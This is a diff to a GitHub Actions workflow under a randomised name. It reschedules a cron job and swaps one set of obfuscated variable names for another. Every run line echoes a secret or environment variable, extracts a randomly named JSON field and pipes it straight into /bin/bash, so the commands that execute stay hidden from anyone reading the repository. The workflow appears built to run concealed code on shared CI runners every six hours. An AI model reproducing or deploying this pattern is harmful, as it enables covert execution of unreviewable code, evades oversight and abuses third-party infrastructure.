@@ -3,29 +3,21 @@ name: liangyizhi3178
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 2/6 * * *'
+    - cron: '35 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liangyizhi3178
         env:
-          jf1: ${{ secrets.jf1 }}
+          qjte13: ${{ secrets.qjte13 }}
         run: |
-          echo $jf1 | jq -r .jt3 | /bin/bash
-          echo $smwlq491 | jq -r .bdnb847 | /bin/bash
-          echo $gu2 | jq -r .vtdai64271 | /bin/bash
-          echo $rfjc91974 | jq -r .ah15 | /bin/bash
-          echo $oum811 | jq -r .wneze0553 | /bin/bash
-          echo $u830 | jq -r .hoe4 | /bin/bash
-          echo $kc4406 | jq -r .lmxg58 | /bin/bash
-          echo $dmp78669 | jq -r .bmae06195 | /bin/bash
-          echo $jj14902 | jq -r .k4 | /bin/bash
-          echo $n7103 | jq -r .y44628 | /bin/bash
-          echo $swo50893 | jq -r .t659 | /bin/bash
-          echo $miq62826 | jq -r .xvq169 | /bin/bash
-          echo $dhmd1 | jq -r .vj549 | /bin/bash
-          echo $q7 | jq -r .qo6095 | /bin/bash
+          echo $qjte13 | jq -r .bahlm0 | /bin/bash
+          echo $mk761 | jq -r .zsgm00 | /bin/bash
+          echo $k38 | jq -r .a1 | /bin/bash
+          echo $lo46385 | jq -r .dzbx48922 | /bin/bash
+          echo $dfxmr58 | jq -r .zf503 | /bin/bash
+          echo $ch0 | jq -r .kgqaz00871 | /bin/bash
 
